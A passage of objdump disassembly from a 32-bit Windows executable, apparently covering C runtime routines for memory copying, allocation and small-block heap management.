  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
